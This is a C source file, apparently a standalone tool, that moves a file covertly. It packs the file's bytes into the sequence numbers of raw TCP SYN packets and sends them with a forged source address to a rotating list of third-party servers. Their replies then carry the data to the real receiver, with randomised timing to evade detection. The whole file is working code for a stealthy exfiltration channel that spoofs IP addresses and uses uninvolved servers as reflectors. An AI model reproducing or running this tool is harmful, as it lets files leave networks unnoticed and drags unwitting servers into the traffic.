/*
 * Copyright (C) 2006, 2007 Sarzyniec Luc <olbat@xiato.net>
 *
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 * see the COPYING file for more informations */

#include <sys/socket.h>
#include <string.h>
#include <stdio.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <malloc.h>
#include <time.h>
#include <stdlib.h>
#ifndef _I386_TYPES_H 
#include <asm/types.h>
#endif
#include <fcntl.h>
#include <unistd.h>
#include "headers.h"

#define DATAGRAM_SIZE 4096
#define BUFFER_SIZE 1024
#define SEQMAX 256

#define DATA ""

/*
 *  If you have problems with transfert that dont finish,
 *  try to increase the delay 
 *
 *  packet structure :
 *  ----------------------------------------------------------------------
 *  | zero
 *  | size of first packet (bytes) 
 *  | first packet data1 (1 byte for the num of the packet,
 *  3 bytes for the data) .... 
 *  | size of second packet
 *  | second packet data ....
 *  | ....
 *  |zero
 *  ----------------------------------------------------------------------
 *
 */


static	char *datagram;
static	struct ipv4_header *iph;
static	struct tcp_header *tcph;
static	struct data *tcpd;
static 	__u8 seqno;
static	struct sockaddr_in sain;
static	__u32 *spooflist;
static	int spooflistnb,freqnb;
static	unsigned long int sdelay,sdelay_m;

/* network functions */
unsigned short csum(unsigned short *buf, int nwords)
{
	unsigned long sum;
	for (sum = 0; nwords > 0; nwords--)
		sum += *buf++;
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	return ~sum;
}

char *set_checksums()
{
	static	char pbuffer[BUFFER_SIZE];
	static	struct pseudo_tcp_header pseudoth;

	tcph->tcpchecksum = 0;

	pseudoth.sourceaddr = iph->sourceaddr;
	pseudoth.destaddr = iph->destaddr;
	pseudoth.proto = iph->proto;
	pseudoth.tcplen = htons(sizeof(struct tcp_header)+tcpd->len);
	pseudoth.zero = 0;

	memcpy(pbuffer,&pseudoth,sizeof(struct pseudo_tcp_header));
	memcpy((pbuffer + sizeof(struct pseudo_tcp_header)),
		tcph,sizeof(struct tcp_header));
	memcpy((pbuffer + sizeof(struct pseudo_tcp_header) 
		+ sizeof(struct tcp_header)),tcpd->data,tcpd->len);

	tcph->tcpchecksum = csum((unsigned short *)pbuffer,
		(sizeof(struct pseudo_tcp_header)
			+ sizeof(struct tcp_header)+tcpd->len)); 

	iph->ipchecksum = csum((unsigned short *) datagram, iph->iphdrlen);

	return pbuffer;
}

/* transfert functions */
void set_new_ip(struct ipv4_header *iph)
{
	static int freq = 1;

	if (!(freq++ % freqnb))
	{
		if (spooflistnb > 1)
		{
			iph->destaddr = (__u32) *(spooflist
				+ ((int) (random() % spooflistnb)));
		}
	}
	/*
	struct in_addr tmp;
	tmp.s_addr = iph->destaddr;
	printf("IP_ADDR %s\n",inet_ntoa(tmp));
	*/
}

int send_seqdata(int fd,__u32 data,char enableno)
{
	int end;
	end = 0;
	set_new_ip(iph);
	iph->id = htons(random());
	if (enableno)
	{
		char tmpc[4];
		__u32 tmpd;
		*tmpc = seqno++;
		memcpy(tmpc+sizeof(char),&data,sizeof(__u32)-1);
		memcpy(&tmpd,tmpc,sizeof(__u32));
		tmpd = htonl(tmpd);
		memcpy(&tcph->seqnum,&tmpd,sizeof(__u32));
	}
	else
	{
		tcph->seqnum = htonl(data);	
	}

	/* printf("SENT_DATA data %#x\n",tcph->seqnum); */

	set_checksums();
	end = sendto(fd, datagram,iph->totlen, 0,
		(struct sockaddr *) &sain, sizeof (sain));

	return end;
}

int send_data(int fd,char *data,int size)
{
	int end;
	static __u32 wbuffer;
	static char rnd;

	end = 0;

	send_seqdata(fd,(__u32) size,0);

	rnd = random() % 2;

	if (rnd)
		usleep(sdelay - ((int)(random() % sdelay_m)));
	else
		usleep(sdelay + ((int)(random() % sdelay_m)));

	seqno = 0;
	while ((size = size - (sizeof(__u32) -1)) > 0)
	{
		memcpy(&wbuffer,data,sizeof(__u32)-1);
		send_seqdata(fd,wbuffer,1);
		data = data + (sizeof(__u32) -1);
	}
	wbuffer = 0;
	memcpy(&wbuffer,data,sizeof(__u32));
	send_seqdata(fd,wbuffer,1);

	return end;
}

int main(int argc,char **argv)
{
	if (argc > 7)
	{		
		char filebuffer[SEQMAX];
		char *data;
		__u16 sourceport,destport;
		__u32 destip;
		struct in_addr *tmpinaddr;
		int sockfd,fd,rdata;
		const int one = 1;

		tmpinaddr = (struct in_addr *) malloc(sizeof(struct in_addr));
		spooflist = (__u32 *) malloc((argc - 7) * sizeof(__u32));
		freqnb = atoi(argv[2]);
		sdelay = atoi(argv[3]) * 1000;
		sdelay_m = sdelay / 10;
		sourceport = (__u16) atoi(argv[4]);
		destport = (__u16) atoi(argv[5]);
		inet_aton(argv[6],tmpinaddr);
		destip = (__u32) tmpinaddr->s_addr;
		spooflistnb = argc - 7;
		for (rdata = 0; rdata < spooflistnb; rdata++)
		{
			inet_aton(argv[7 + rdata],tmpinaddr);
			*(spooflist + rdata) = (__u32) tmpinaddr->s_addr;
		}
		free(tmpinaddr);

		srand(time(NULL));

		datagram = (char *) malloc(DATAGRAM_SIZE * sizeof(char));
		iph = (struct ipv4_header *) datagram;		
		tcph = (struct tcp_header *) (datagram
			+ sizeof(struct ipv4_header)); 	
		tcpd = (struct data *) malloc(sizeof(struct data));
		tcpd->data = (char *) (datagram + sizeof(struct ipv4_header) 
			+ sizeof(struct tcp_header));
		tcpd->len = 0;

		memset(&sain,0,sizeof(struct sockaddr_in));
		sain.sin_family = AF_INET;
		sain.sin_addr.s_addr = 1;


		memset(datagram,0,DATAGRAM_SIZE);

		data = DATA;
		tcpd->len = strlen(data);
		memcpy(tcpd->data,data,tcpd->len);

		iph->version = 4;
		iph->iphdrlen = 5;
		iph->tos = 0;
		iph->totlen = (__u16)(sizeof(struct ipv4_header)
			+ sizeof(struct tcp_header) + tcpd->len);
		iph->id = htons(random());
		iph->fragoffset = 0; 
		iph->ttl = 0xff;
		iph->proto = IPPROTO_TCP;
		iph->ipchecksum = 0;
		iph->sourceaddr = destip; /* inet_addr(IP_SRC); */
		iph->destaddr = spooflist[0]; /* inet_addr(IP_DST); */

		tcph->sourceport = htons(sourceport); /* htons(PORT_SRC); */
		tcph->destport = htons(destport); /* htons(PORT_DST); */
		tcph->seqnum = 0;
		tcph->acknum = 0;
		tcph->tcphdrlen = 5;
		tcph->res = 0;
		tcph->fin = 0;
		tcph->syn = 1;
		tcph->rst = 0;
		tcph->psh = 0;
		tcph->ack = 0;
		tcph->urg = 0;
		tcph->ece = 0;
		tcph->ecn = 0;
		tcph->window = htons(2);
		tcph->tcpchecksum = 0;
		tcph->urgptr = 0;

		set_checksums();

		if ((sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW)) < 0)
		{
			perror("socket");
			exit(1);
		}

		if (setsockopt(sockfd, SOL_IP, IP_HDRINCL,(char *)&one, 
			sizeof (one)) < 0)
		{
			puts("Warning: Cannot set HDRINCL! You must be root\n");
			exit(1);
		}

		if (send_seqdata(sockfd,0,0) < 0)
		{
			perror("sendto");
		}
		else
		{
			fputs("ok, starting the file transfert ...\n",stdout);
			fd = open(argv[1],0);
			while ((rdata = read(fd,filebuffer,SEQMAX)) > 0)
				send_data(sockfd,filebuffer,rdata);
			close(fd);
			usleep(sdelay);
			send_seqdata(sockfd,0,0);
		}
		close(sockfd);

		free(datagram);
		free(spooflist);
		free(tcpd);

		fputs("file transfert done.\n",stdout);
	}
	else
	{
		fprintf(stdout,	"usage : %s <filename> <IP changement frequency"
				"> <delay between 2 packet of %d bytes"
				"(milliseconds)> <source port> <destination "
				"port> <destination IP> <list of IP usable to "
				"spoof>\n"
				"(it is better to use IP of servers which have "
				"about same latency to spoof)\n",argv[0],SEQMAX);
	}
	return 0;
}

